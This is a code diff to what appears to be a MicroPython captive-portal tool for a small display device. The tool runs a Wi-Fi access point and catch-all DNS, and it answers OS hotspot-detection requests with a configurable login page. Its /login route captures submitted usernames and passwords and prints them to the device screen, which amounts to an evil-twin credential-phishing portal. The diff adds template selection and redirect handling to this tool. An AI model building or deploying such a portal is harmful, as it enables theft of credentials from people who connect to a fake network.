@@ -9,6 +9,7 @@
 
 import uasyncio  # type: ignore
 import sys
+import os
 
 # Third party packages
 from modules.phew import access_point, dns, server
@@ -34,6 +35,7 @@ class PortalService:
     ):
         # Dependencies
         self.messages = messages
+        self.options = options
         self.pico_display_led = pico_display_led
 
         # Properties
@@ -49,16 +51,16 @@ class PortalService:
         await self.messages.display("Starting access point")
         ap = access_point(self.ssid, self.password)
         await self.messages.display(f'AP "{self.ssid}" started')
-        await self.messages.display("AP Password:")
-        await self.messages.display(f"{self.password if self.password else 'None'}")
+        await self.messages.display(f"AP Password: {self.password if self.password else 'None'}")
         self.ip = ap.ifconfig()[0]
-        await self.messages.display("AP IP:")
-        await self.messages.display(self.ip)
+        await self.messages.display(f"AP IP: {self.ip}")
 
     async def start_dns_server(self):
         await self.messages.display("Starting DNS server")
-        await self.messages.display("Domain:")
-        await self.messages.display(self.domain)
+        await self.messages.display(f"Domain: {self.domain}")
+
+        template = self.options.get_option("template", "example.html")
+        await self.messages.display(f"Template: {template}")
 
         if self.ip:
             dns.run_catchall(self.ip)
@@ -83,7 +85,7 @@ class PortalService:
     def register_routes(self):
         @server.route("/", methods=["GET"])
         def index(request):
-            return render_template("templates/index.html")
+            return self.render_default_template()
 
         @server.route("/success", methods=["GET"])
         def success(request):
@@ -103,17 +105,36 @@ class PortalService:
 
         @server.route("/hotspot-detect.html", methods=["GET"])
         def apple(request):
-            return render_template("templates/index.html")
+            return self.render_default_template()
 
         @server.route("/login", methods=["GET"])
         def login(request):
             username = request.query.get("username")
             password = request.query.get("password")
+            redirect_target = request.query.get("redirect")
+
             uasyncio.create_task(
                 self.messages.display(f"Login U: {username} P: {password}")
             )
-            return redirect(f"http://{self.domain}/success")
+
+            if not redirect_target:
+                return self.render_default_template()
+
+            redirect_file = redirect_target.strip("/")
+
+            if os.path.exists(f"templates/{redirect_file}.html"):
+                return redirect(f"http://{self.domain}{redirect_target}")
+            else:
+                return self.render_default_template()
 
         @server.route("/<path>", methods=["GET"])
         def catch_all(request, path):
             return redirect(f"http://{self.domain}/")
+
+    def render_default_template(self):
+        try:
+            default_page = self.options.get_option("template", "example.html")
+            return render_template(f"templates/{default_page}")
+        except Exception:
+            return render_template("templates/example.html")
+        
